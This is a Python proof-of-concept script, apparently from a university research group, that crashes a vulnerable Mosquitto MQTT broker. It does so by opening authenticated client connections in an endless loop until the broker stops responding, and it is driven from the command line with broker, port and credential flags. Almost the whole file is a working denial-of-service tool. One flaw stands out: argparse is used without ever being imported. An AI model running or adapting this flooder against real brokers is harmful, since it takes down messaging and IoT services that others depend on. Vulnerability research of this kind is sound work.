#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time

"""
dos.py, Crashes a vulnerable mosqsuitto broker
@author: tzimmermann @ AG Verteilte Systeme, Uni Osnabrueck
@date: 19.03.2018
"""


class MQTT_DoS:

    def __init__(self, hostname, port, credentials):
        """Constructor sets up a Denial of Service Attack
           :param string hostname: Hostname or IP of the broker
           :param int port: Port of the broker
           :param tuple credentials: tuple of valid username and password for a client
           """
        self.hostname = hostname
        self.port = port
        self.credentials = credentials


    def run(self):
        """Start new paho-mqtt clients until the broker seems crashed, then return
           :return : return without value if broker has crashed
           """
        mqtt_list = []
        timeout = 0.1
        mqtt_block= mqtt.Client()
        mqtt_block.username_pw_set(self.credentials[0], self.credentials[1])
        mqtt_block.connect(self.hostname, self.port)

        # Block till broker seems crashed
        while(not mqtt_block.loop(timeout)):
            mqttc = mqtt.Client()
            mqtt_list.append(mqttc)
            mqttc.username_pw_set(self.credentials[0], self.credentials[1])
            # connect non-blocking
            mqttc.connect_async(self.hostname, self.port)
            mqttc.loop_start()
        
        # disconnect all clients after successful crash
        mqtt_block.disconnect()
        for m in mqtt_list:
            m.disconnect()

        # return if broker has crashed
        return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Launches multiple mqtt-subscribers until the broker crashes')
    parser.add_argument('--broker', '-b',
                        help='hostname or ip of the broker to connect to',
                        default='localhost')
    parser.add_argument('--port', '-p',
                        help='port of the broker',
                        default='1883',
                        type=int)
    parser.add_argument('--user', '-u',
                        help='user',
                        default='username',
                        type=str)
    parser.add_argument('--password', '-P',
                        help='password',
                        default='Password for >username<',
                        type=str)
    args = parser.parse_args()
    crasher = MQTT_DoS(args.broker, args.port, (args.user, args.password))
    crasher.run()
